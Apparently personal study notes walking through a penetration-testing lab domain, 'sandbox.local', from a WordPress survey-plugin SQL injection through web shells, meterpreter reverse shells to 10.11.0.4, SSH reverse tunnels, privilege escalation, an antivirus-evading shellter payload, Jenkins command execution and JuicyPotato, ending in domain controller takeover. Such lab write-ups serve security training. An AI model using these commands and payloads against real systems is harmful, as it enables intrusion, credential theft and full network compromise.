For this walkthrough, the client has provided us an initial target named "sandbox.local" and has mentioned that a compromised Domain Administrator account woul dhave the greatest impact on thier business.
1. Copy the existing **/etc/hosts** file to **hosts.orig** in our home directory, then add the new entry that will allow us to contact the domain via its DNS name by running : **sudo bash -c " echo ‘10.11.1.250 sandbox.local’ >> #/etc/hosts"

# Public Network Enumeration
Conduct a scan of the external host resolvable by DNS name
- **sudo nmap -sC -sS -p0-65535 sandbox.local** 
- In this case, ports 22 and 80 are open.  80 has the higher risk, so we'll start there.

# Targeting the webapp
Visit the webpage.  In this case, nothign remarkable other than a couple of input fields for polling questions.  We need to validate the nmap output of *wordpress v. 5.3*, and with wordpress in particular we know that *themes* and *plugins* often have vulnerabilities that are improperly patched or never fixed at all.

## Webapp enumeration
1. Start with a basic #directory brute force to look for #sensitive_files. 
	- **dirb http://sandbox.lcoal** 
2. We will also run *wpscan* as it's tailor-made with options "all plugins", "all themes", "config backups", and "db exports"
	- **wpscan --url sandbox.local --enumerate ap,at,cb,dbe**  
	- This scan turns up 3 items of interest : *elementor*, *ocean-extra*, & *wp-survey-and-poll*
3. Run those 3 items of interest through **searchsploit** 
	- Searchsploit turns up interesting options for *Wordpress Plugin Survey & Poll 1.5.7.3* - let's inspect 
	- The exploit mentions how to exploit, and we google the plugin to see if there's anything of interest.  
4. Open up #BurpSuite and answer the Poll that you noted on the webpage.  Reload the page and find the cookie that was mentioned in hte exploit that we inspected previously.  
jan
## SQL Injection Exploitation
1. Send the response with the cookie noted above to repeater in burp.
2. Take the payload from the original exploit and place it into the cookie field as explained in the exploit.
	- The exploit mentioned that the result of the #SQLi will be placed in the *sss_params* variable within a "script" tag.  Search for that variable in Burp and validate the SQLi output.  We see the version of the DB (***10.3.20-MariaDB***)
	- *Note* - MariaDB is a fork of #MySQL and SQLi exploits for MySQL typically work for MariaDB as well.
3. Now let's determine next steps.  We could upload a #PHP shell to try to get RCE, we favor enumeration in BURP.  Enumerate the table name ![[Pasted image 20221108172154.png]] 
	- This gives us a table, wp_users.  Enumerate the column_names ![[Pasted image 20221108172320.png]]
	- This gives us user_login and user_pass.  Enumerate the logins.![[Pasted image 20221108172412.png]]
	- Only one username : *wp_ajla_admin*.  Get the pw hash. ![[Pasted image 20221108172504.png]]
	- We have the password hash !  (*Note* - the three `\` to escape the single "/")

## Cracking the password 
1. Create a file containing the password hash ![[Pasted image 20221109170521.png]] 
2. Use John and the --wordlist option to try to crack that file.   This results in !love29jan2006!
3. Try to log into the admin page at **/wp-admin** and note that you're in !  Enumeration continues.

## Enumerating the Admin Interface 
1. Good starting point is the *Tools > Site Health > Info* tab to get further info on server versions/IP Addy, DB versions/IP Addy, etc. 
2. Because we have admin access, we can install plugins.  In the case of wordpress, there are already quite a few in the *seclists* package under Web-Shells.  ***remember Danté*** 

## Obtaining a Shell 
1. Because the webapp accepts plugins in .zip format, we must #zip the plugin 
	- **sudo zip plugin-shell.zip plugin-shell.php** 
2. With that done, the shell needs to be uploaded.
3. Once it's uploaded,we can use it to attempt to run systme commands on the wp target using *cURL* ![[Pasted image 20221109171610.png]] 
4. Now, we work on a full reverse shell by generating a meterpreter payload using **msfvenom** (Use port 443to avoid any outbound firewall rules)
	- **msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.11.0.4 LPORT=443 -f elf > shell.elf** 
5. Once that's completed, set up a python webserver so the target can download the shell
	- **sudo python3 -m http.server 80**
6. Use cURL again to wget the file.  ***note*** you must encode spaces in URLs.  You should note an entry in your python server. ![[Pasted image 20221109172105.png]] 
7. You need to make it executable, start a msf payload handler on Kali, and run the *elf* file to get a meterpreter shell.  Run **chmod +x** through cURL.![[Pasted image 20221109172312.png]] 
8. Start a meterter payload listener on the appropriate interfaceand port ![[Pasted image 20221109172400.png]] 
9. With that listener going, use cURL to get the #reverseShell  ![[Pasted image 20221109172442.png]] 

## Post-Ex Enumeration
1. Use the **ifconfig** / **ip a** command to get host and network config information
2. **hostname**, **cat /etc/issue**, **cat /proc/version** 
3. Knowing that the target is running WordPress and the #DB is on another host, there should be DB creds somewhere else. Google tells us that the **wp-config.php** file has DB config information. This gives us creds and a DB IP addy ! ![[Pasted image 20221110153545.png]] 

## Creating a stable #pivot point
since the WordPress machine nad the DB are on separate networks, this is a great time to use a #tunnel.
1. From the WebServer we don't have nmap installed.  This is a good time for a quick script to scan the host. ![[Pasted image 20221110154005.png]]
2. Once the script is created, upload it to the WordPress machine, give it a **chmod +x**, and execute it.  In this case, we see that for the DB server, ports 22 and 3306 are open. So let's set up the #reverseTunnel  **ssh -R 1122:10.5.5.11:22 -R 13306:10.5.5.11:3306 kali@10.11.0.4**.  We also want to add here 2 flags to automatically accept the host key of our Kali machine.  **-o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no"** 
	1. All together, this command looks like **ssh -R 1122:10.5.5.11:22 -R 13306:10.5.5.11:3306 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" kali@10.11.0.4** 
2. Next, we need to generate ssh keys on the WordPress host to avoid bing asked for a password. 
	1. **mkdir keys**
	2. **cd keys**
	3. **ssh-keygen**
	4. **cat id_rsa.pub** 
		1. This new public #key needs to be entered in our Kali host's **authorized_keys** file too allow the private key (web server) to log in to our Kali machine, but prevents them from running commands and only allows for port forwarding. ![[Pasted image 20221110160243.png]] 
	5. Next, add a couple of flags to the SSH command to ensure it works as intended.  **-N** to specify no commands, **-f** to request SSH go to the background, and **-i** to provide the key file. In your shell, the command you run will look like this : 
			**ssh -f -N -R 1122:10.5.5.11:22 -R 13306:10.5.5.11:3306 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i /tmp/keys/id_rsa kali@10.11.0.4** 
	6. At this point, make sure the ports are open with **sudo netstat -tulpn**.  Th eend result is, even if our shell dies we still have remote acces to the DB server through the remote utnnel.

# Targeting the DB

## Enumeration
Time to connect to the DB and start enumerating
1. Using our reverse tunnel, we run **mysql --host=127.0.0.1 --port=13306 --user=wp -p** and enter the DB password we enumerated with prompted.
2. Use **SHOW Grants;** to understand our permissions *note the semicolon to close the command*
3. use **show variables;** to see what else may be important.  We note that the #hostname is *"zora"* and that the *plugin_dir* is set to **/home/dev/plugin/**
4. A quick search of Searchsploit turns up nothign for #MariaDB.  That said, **searchsploit mysql** turns up several results of interest; we need to look for commonalities since MySQL and MariaDB use different version numbers.  "UDF" and "User Defined" show up a lot, so we pick one of those and investigate a bit deeper.
	- Diving into the script, it is essentially only running 5 commands.  They are : ![[Pasted image 20221110162050.png]] 
	- Theoretically, we should be able to run these directly in the interctive mariaDB shell that we already have.

## Attempting to Exploit the DB
The reference in the exploit we looked at state that **raptor_udf.c** was used.  We google that and find an ExploitDB entry.  The comments at the bottom of that point to a #GitHub project, which we **git clone** and study the .c file.
1. Looking at the **install.sh** file, we see a pre-req for *libmysqlclient15-dev*, so we **apt install default-libmysqlclient-dev** 
2. Looking at the **Makefile**, we need to adjust the include directory path for the **gcc** command since we have a MariaDB installation, not a MySQL. 
3. The second command above references binary 0xshellcode into dumpfile, so we set the file as a hexdump.  using the command **`xxd -p lib_mysqludf_sys.so | tr -d '\n' > lib_mysqludf_sys.so.hex`** 
4. We try to execute the exploit, but fail on the 2nd command because we don't have the required permissions.
5. Why we failed
	- We have the permissions to run the commands, but the wp user is missing the *FILE* permissions to be allowed to run *dumpfile*. We can't move forward on this path, and so we go back to user Ajla (initial compromise) and try to find root MariaDB credentials.

# Deeper enumeration of the webapp server 
We'll start with concentrating our enumeration efforts on #privilege_escalation from the *www-data* user, then move to searching for MariaDB creds

## More thorough #post-exploitation 
1. Start by running **netstat -tulpn** to see if any interesting processes are running.  There are not, in this case, so we check for kernel-level exploits using **uname -a**. 
2. We get the kernel version and drop it into searchsploit. We see one that catches our eye, so we searchsploit **-m**, then review the source code. 
3. Ajla does not have the **gcc** binary installed - this means we'll need to #compile the exploit on the Kali machine, then transfer it to Ajla.

## #privilege_escalation 
1. Copy the exploit to the **/home** directory to have a clean copy, then follow the compile instructions in hte file.  **gcc 45010.c -o 45010**.  Once complete, upload it to Ajla.
2. Once the file is transferred, hit it with **chmod +x**, then run it with **./45010**, then verify that it worked. In this case, we run **whoami** and see that we've gotten root !
3. Now we can use **ssh** to make a more stable backdoor.  Start by generating a new ssh #key on our kali machine.
	- **ssh-keygen**, then **cat: ~/.ssh/id_rsa.pub** 
4. Create the **authorized_keys** file on Ajla to accept our public key.
	- **mkdir /root/.ssh**, then **echo "ssh-rsa dqjdqjdjleameav kali@kali'' > /root/.ssh/authorized_keys** 
5. On the Kali machine, run **ssh root@sandbox.local

## Searching for DB creds
When searchign for creds, think like an admin or a dev !
1. Take a look in the **/var/log/auth.log** file, in case a user accidentally enters their password in the username field and it gets logged.
2. Look at the **/etc/passwd**, **/etc/group** and the **/etc/shadow** 
3. Enumerate ajla's home directory to see what their is and read the #bashHistory (**.bash_history**) file to see what this user has run. In this case, this user has logged into the mysql server using command line arguments, which are logged ! ![[Pasted image 20221110165524.png]] 

# Targeting the DB again

## Exploitation
Now that we have root DB creds for Zora's MariaDB instance, so we go back and try the UDF exploit again with root perms. 
1. As before, try to run the 5 commands after logging into mysql as root with : run **mysql --host=127.0.0.1 --port=13306 --user=root -p** and enter the DB password we enumerated with prompted.
2. set the *shell* variable to the #shellcode we generated earlier ![[Pasted image 20221110165935.png]] 
3. Run **select @@plugin_dir;** 
4. Now, run the 2nd command (that failed earlier).  Note that it works !
5. Run the 3rd command and note that it returns no errors.
	- We validate that it works by making a network call from the DB. Do this by starting a python server (**sudo python3 -m http.server 80**) and run **select sys_exec('wget http://10.11.0.4');** and look for the entry in our python server. It worked !
6. Send the reverse shell to your listener and run **whoami** - ntoe that you are now the *mysql* user

## #post-exploitation enumeration
1. Start with **cat /etc/issue** to get more info, followed by **/proc/version**.  Note that this is Alipne linux, which is a lesser-known distro. 
2. Continue by running **env**, **ps aux**, **netstat -tulpn** ... for the moment, nothign wild. However, running **cat /etc/fstab** shows an interesting share mounted  - */mnt/scripts* at 10.5.5.20
3. **cd** into that fileshare and start poking around.  We see a **system_report.ps1** file that, upon further inspection, contains a new computer name and a set of creds !!!!! Download and save all scripts, of course![[Pasted image 20221110171949.png]] 

## Creating a stable #reverseTunnel 
1. run **ssh -v** to see the version of SSH.  In this case, Zora is running a newer version of hte ssh client that allows us to establish a very useful type of tunnel via reverse dynamic port forwarding ; this would give us full network access to the 10.5.5.0/24 sandbox internal network through a SOCKS proxy running on our Kali machine !
2. We need a new ssh #key on Zora and to run the ssh client in a way that does not require interaction. On Zora, run **ssh-keygen**, then **cat /var/lib/mysql/.ssh/id_rsa.pub**, and setup the **authorized_keys** file on our Kali machine in the sameway we did earlier. ![[Pasted image 20221110172506.png]] 
3. Run the port forwarding command : **ssh -f -N -R 1080 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i /var/lib/mysql/.ssh/id_rsa kali@10.11.0.4**. Verify the port is funcitoning by running **netstat** on the kali machine. 
4. Configure #proxyChains on Kali to use the #SOCKS4 proxy by adding **socks4 127.0.0.1 1080** to the **etc/proxychains.conf** file.

# Targeting Poultry

## Network #enumeration
1. Run **Nmap** through *ProxyChains* using the **proxychains** command : **proxychains nmap --top-ports=20 -sT -Pn 10.5.5.20** 
	- We note that ports 135, 139, 445 and 3389 are open, but port 53 is closed.  With port 53 closed, we can assume it's not the DC as ***the #DC commonly has port 53 open***  

## Exploitation (Or just logging in)
1. We know that #RDP is open on *tcp/3389*, so we can attempt to use the creds we just found on Ajla to connect using *xfreerdp* (again, with #proxyChains).  Add teh *+clipboard* flag to allow us to copy and paste to POULTRY.
	- **proxychains xfreerdp /d:sandbox /u:alex /v:10.5.5.20 +clipboard** 
	- Note that the credentials worked. 

## #post-exploitation Enumeration
1. First thing to note is the #AV - it's running McAfee Endpoint Security.
2. Next, typical enumeration commands.  Start with **systeminfo**.  Next, we run **netstat -ano** to see what ports are open (here we validate that our nmap scan did, in fact, find all the ports of interest.)
3. Next, let's see more info about user *alex* by running **net user /domain alex**
	- Note that alex is just a regular domain user. 
4. Let's see what #services are running on this endpoint using #wmic : **wmic service get name,displayname,pathname,startmode**.  This will give us a massive list.  Piping it through **findstr** to look for the word "auto" to see services automatically started.  **wmic service get name,displayname,pathname,startmode | findstr /i "auto"**.  This is also huge - let's filter out anythign from " `c:\windows` " with **`wmic service get name,displayname,pathname,startmode | findstr /i "auto" /v "c:\windows"`** 
	- Note that "Puppet Agent" has an #unquotedServicepath in `C:\Puppet\Current Version\sys\ruby\bin\ruby.exe`!
5. Let's see what user runs this service, to see if it's in the context of a higher privileged user yb searching for "Services" in the start menu.  In this case, it runs as LocalSystem.
6. Next, let's see if `C:\Puppet` directory is writable.  Use the **icacls** command to check what permissions we have. **`icacls "C:\Puppet"`**.  Note that we do !
7. To try to take advantage of the #unquotedServicepath , we'll need to create a reverse shell named **Current.exe** 

## #unquotedServicepath exploitation
Since we know that AV is running, we will use #shellter to inject a meterpreter payload into a Windows binary that will hopefully bypass McAfee
- Ensure that *shellter* is installed with #Wine on Kali.

1. Make a directory named **Poultry** to work out of on your kali machine.  copy a legitimate adn well-known windows binary to it. **cp /usr/share/windows-resources/binaries/whoami.exe ./Poultry** 
2. Generate the meterpreter payload to use with shellter.  Use port 80 to hopefully avoid any firewall restrictions. Use **-i** to specify an arbitrary number of encodign operations.
	- **msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.0.4 LPORT=80 -e x86/shikata_ga_nai -i 7  -f raw > met.bin** 
	- ***Note*** : you can also use a non-meterpreter payload if you don't want to use metasploit for the exam.  Send the reverse shell to a #nc listener.  
3. Now we launch #shellter to dynamically #inject it into the **whoami.exe** binary.
	- Type **shellter** into Kali, then select "A" for auto mode.  Specify the target PE file : **/home/kali/poultry/whoami.exe** 
	- In this case, we don't need whoami to function properly after payload execution, so we select N for Stealth mode.
	- Type C to use a custom payload, then type in your payload : **/home/kali/poultry/met.bin** and select N for reflective DLL loader.
4. Transfer the whoami.exe binary to Poultry and place it in the correct location with a #pythonServer : **sudo python3 -m http.server 80**.  Navigate to the the python server on the target machine and save whoami.exe
5. Change the binary name to **Current.exe** and copy/paste it to **`C:\Puppet`** 
6. Start **msfconsole** to generate the listener to catch the #reverseShell  and #migrate it into another process  and ensure that the shell stays connected even if Windows thinks the service has failed to start.
	- **`sudo msfconsole -q -x "Use exploit/multi/handler;\set PAYLOAD windows/meterpreter/reverse_tcp;\<span custom-style="BoldCodeRed">set AutoRunScript post/windows/manage/migrate;\set LHOST 10.11.0.4;\set LPORT 80;\run"</span>`** 
7. Attempt to restart Poultry and wait for the reverse shell.  We can establish #persistence by running **net user** to reset the password.
	- Once we get our shell and verify #SYSTEM privs with whoami, run **net user poultryadmin OffSecHax1!** to change the password, then login via RDP (we don't ned the **/d** from before since we're logging in as the local admin user and not a domain user)
	- **proxychains xfreerdp /u:poultryadmin /v:10.5.5.20 +clipboard** 
	- Note that we now have admin access to Poultry !

## #post-exploitation enumeration
1. List the #domainTokens of any logged in users by username.  In meterpreter, we type **use incognito** and then **list_tokens -u** 
2. Continue looking and not that Thunderbird is installed (but not set up for the admin user).
	- Check the mailbox y navigating to **`C:\Users\alex\AppData\roaming\Thunderbird\Profiles\jbv4ndsh.default-release\Mail\mail.sandbox.local\Inbox`** 

# Internal network enumeration
*Note - it's important to periodically stop and mindmap whta we already know about the network*
![[Pasted image 20221114104655.png]] 
 1. To scan the internal network, we can write a quick one-liner with a *for loop* to ping every host on the network.  
	 - **/L** flag to accept a replaceable parameter, **%i** as the replaceable parameter (*start, step, end*), send one ping and a short timeout(**-w 200**).  Send teh output to the null interface (**> nul**) and print if the host is up.
	- **for /L %i in (1,1,255) do @ping -n 1 -w 200 10.5.5.%i > nul && echo 10.5.5.%i is up** 
	- This gives us 5 hosts.  10.5.5.1 is the gateway, 10.5.5.11 (Zora) and 10.5.5.20 (Poultry) we've already compromised.  10.5.5.25 and 10.5.5.30 are of interest.
2. From the Kali machine, run a #proxyChains #nmap scan on the top 1000 ports
	- **proxychains nmap --top-ports=1000 -sT -Pn 10.5.5.25,30 --open** ![[Pasted image 20221114105609.png]]

## Reviewing the results

1. Conduct a deeper scan on 10.5.5.30  as it appears to be the #DC 
	- **proxychains nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,3389 -sC -sT -Pn 10.5.5.30** 
	- The DC doesn't seem to have any configs that jump out at us from this look - it seems well configured.  Lets check 10.5.5.25
2. Conduct a deeper scan on 10.5.5.25 
	- **proxychains nmap -p135,139,445,8080 -sC -sT -Pn 10.5.5.25** 
	- Here, we see an OS and a computer name (**Cevapi**).  Also of note, SMB2 signing is enabled, not required.  This could enable a **responder** attack.
	- Let's configure firefox to use our #SOCKS4 proxy adn visit the webserver on 8080.  The SOCKS host must be set to 127.0.0.1:1080 and select the *SOCKS v4* radio button.
	- This brings us to a #Jenkins CMF login page.  This may expose some attack surface.

# Targeting the #Jenkins server
As with most automation servers, continuous integration and delivery ools like Jenkins are usualy able to execute code.

## Application Enumeration
1. View the #documentObjectModel( #DOM) by right clicking and selecting *Inspect Element*
	- with #devTools open to the inspector tab, right click the top HTML tag and select *Expand All*
2. View the source code of the page by right-clicking and selecting *View Source*
3. Run a **dirb** scan to discover hidden files or directories and a **-w** to continue scanning past hte warningmessages
	- **proxychains dirb http://10.5.5.25:8080/ -w** 
4. Try common creds / #defaultCreds 
	- by sheer luck, admin:admin worked !

## Exploiting jenkins
Googling #Jenkins documentation is enough to learn how to create a project that will allow us to execute system commands.
1. Select *New Item* on the upperleft
2. Give the item a non-malicious sounding name like "Access" and select *Freestyle project*
3. Go into the *Build* configuration and select *Add build step* and select "Execute Windows batch command"
4. Enter "whoami" in the *Command* text box and *Save*
5. Go to the Access item's main page and select *Build Now* to run the command
6. Under *Build History*, click on the hyperlinked "#1" and look in teh "Console Output" page 
	![[Pasted image 20221114114837.png]]
7. We'll try using the same whoami backdoored shell that we generated earlier to try to obtain a meterpreter shell on Cevapi.
	- Set up a #pythonServer to download the shell from, use Jenkins to download the shell, start the meterpreter listener on kali, and run the backddoored executable using Jenkins.
	- Dowload the shell with Jenkins : in the Access proejct *Configure* tab, run : ![[Pasted image 20221114115352.png]] 
	- once the file is downloaded, stop the python server and start the msfconsole payoad.
8. If everything worked as expected, we'll have shell access (verify by running **whoami**).  Next, a quick enumeration with **net user jenkinsuser** 

## #post-exploitation Enumeration
Now to try to find a #privilege_escalation pathway in Cevapi.
![[Pasted image 20221114120446.png]] 

1. First things first - let's run the **whoami /priv** command.  ***note*** - we have the #SeImpersonatePrivilege !!!! This could lead to #JuicyPotato
2. Next, let's run **systeminfo** to further enumerate

## #privilegeEscalation 
The #JuicyPotato source code can be found at https://github.com/ohpe/juicy-potato. 
1. Once **JuicyPotato.exe** is on the kali machine, we use our meterpreter shell to upload it to Cevapi (**upload /home/kali/cevapi/JuicyPotato.exe c:/Users/Public/JuicyPotato.exe**)
	- per the documentation, we need to provide **-t**, **-p**, and **-l** 
	- `C:\Users\Public\JuicyPotato.exe -t t -p C:\Users\Pulic\whoami.exe -l 5837`
2. Start a new listener and run the Jenkins build.
	- Note we get a system shell

## #post-exploitation enumeration
1. Since Cevapi is domain-joined, let's see if any domain accounts are logged in to #impersonate their tokens.  From the meterpreter shell, type **use incognito** and **list_tokens -u** 
	- Note that we appear to have ***`sandbox\Administrator`*** logged in !  
2. We try to impersonate this user to verify that we can escalate our privs
	- In meterpreter, use **impersonate_token sandbox\\Administrator** 
	- Note that it appears to be successful upon using the **getuid** command followed by the **shell** command and the **whoami** command.
3. Next, run **net user /domain administrator** 
	- note that the output indicates that the user administrator is a member of Domain Admins and Enterprise Admins groups

# Targeting the #DC 
![[Pasted image 20221114132922.png]] 

## exploiting the #DC 
With the ability to run commands as the domain admin user, one way we can get access to the DC is by using hte PowerShell *New-PSSession* cmdlet to open a new session against a remote host.
1. Discover the DCs hostname using the **nslookup** command (no options runs it in interactive mode)
	- Run **set type=all** to look at all types, then run a lookup on the  **``_ldap._tcp.dc._msdcs.sandbox.local``** entry within the sandbox.local domain.  The resulting #hostname is SANDBOXDC.sandbox.local
2. With the hostname in-hand, we launch powershell from the administrator meterpreter shell and run the following command : **$dcsesh = New-PSSession -Computer SANDBOXDC** 
3. Use *Invoke-Command* to run a command against the DC along with the *-Session* and *-ScriptBlock* flags to execute commands
	- **Invoke-Command -Session $dcsesh -ScriptBlock {ipconfig}** 
	- note that we can run commands as the DC.
4. Transfer and execute the meterpreter shell by using the same whoami.exe with AV bypass.
	- **`Copy-Item "C:\Users\Public\whoami.exe" -Destination "C:\Users\Public\whoami.exe" -ToSession $dcsesh`** 
5. Now we need to start a new listener. 
	- Run the **run -j** option to start it as a background job
	- list the metepreter sessions (**sessions -l**), then select theadministrator session  for Cevapi (**sessions -i 2**)
	- Run the **powershell** command
	- Execute the PowerShell command to run the whoami binary on the DC
		- **$dcsesh = New-PSSession -Computer SANDBOXDC** 
		- **``Invoke-Command -Session $dcsesh -ScriptBlock {C:\Users\Public\whoami.exe}``**  
	- Background the Cevapi session and open up the Meterpreter session 3 that was opened up.
	- Verify with a **whoami** and **hostname** command, and validate that you are the DC!